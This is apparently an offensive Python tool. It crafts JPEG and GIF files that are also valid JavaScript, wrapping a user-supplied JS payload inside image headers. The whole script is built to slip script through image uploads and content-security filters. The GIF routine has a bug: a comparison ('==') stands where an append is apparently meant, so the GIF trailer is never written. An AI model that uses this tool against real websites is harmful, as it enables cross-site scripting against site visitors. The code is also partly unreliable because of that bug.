import struct, sys, argparse

def jpg_check_dims(height, width):
  if height < 1 or height > 65535:
    print('[!] 1 <= HEIGHT <= 65535')
    sys.exit(1)
  if width < 1 or width > 65535:
    print('[!] 1 <= WIDTH <= 65535')
    sys.exit(1)


def craft_jpg_polyglot(height, width, payload):
  data = b'\xFF\xD8\xFF\xE0'
  data += b'\x09\x3A'
  data += b'\x4A\x46\x49\x46'
  pay = '=1;'
  if(len(payload) > 0 and payload[-1] != ';'):
    payload += ';'
  pay += payload
  pay += '/*'
  nopsled = 2356
  if len(payload) > nopsled:
    print('[!] Payload > nopsled')
    sys.exit(1)
  nopsled = nopsled - len(pay)
  data += pay.encode('utf-8')
  data += b'\x00' * nopsled
  data += b'\xFF\xC0\x00\x11\x08'
  data += struct.pack('!H', height)
  data += struct.pack('!H', width)
  data += b'\x2A\x2F'
  data += b'\xFF\xD9'
  return data


def craft_gif_polyglot(payload):
  data = b'\x47\x49\x46\x38\x39\x61'
  pay = '=1;'
  if(len(payload) > 0 and payload[-1] != ';'):
    print('[+] added a semicolon at the end of the command')
    payload += ';'
  pay += payload
  data += pay.encode('utf-8')
  data == b'\x3b'
  return data


def save_polyglot(data, output_file):
  with open(output_file, 'wb') as f:
    f.write(data)


def main():
  parser = argparse.ArgumentParser()
  subparsers = parser.add_subparsers(dest='img_format', help='image format')
  jpg_parser = subparsers.add_parser('jpg', help='craft jpg polyglot')
  jpg_parser.add_argument('-H', '--height', default=1024, type=int, help='jpg height', dest='height')
  jpg_parser.add_argument('-W', '--width', default=1024, type=int, help='jpg width', dest='width')
  jpg_parser.add_argument('-p', '--payload', required=True, type=str, help='js payload (separate commands with a semicolon)', dest='payload')
  jpg_parser.add_argument('-o', '--output', required=True, help='specify filename for output', dest='output_file')
  gif_parser = subparsers.add_parser('gif', help='craft gif polyglot')
  gif_parser.add_argument('-p', '--payload', required=True, type=str, help='js payload (separate commands with a semicolon)', dest='payload')
  gif_parser.add_argument('-o', '--output', required=True, help='specify filename for output', dest='output_file')
  args = parser.parse_args()

  if args.img_format == 'jpg':
    jpg_check_dims(args.height, args.width)
    data = craft_jpg_polyglot(args.height, args.width, args.payload)
    save_polyglot(data, args.output_file)

  elif args.img_format == 'gif':
    data = craft_gif_polyglot(args.payload)
    save_polyglot(data, args.output_file)

if __name__ == '__main__':
  main()
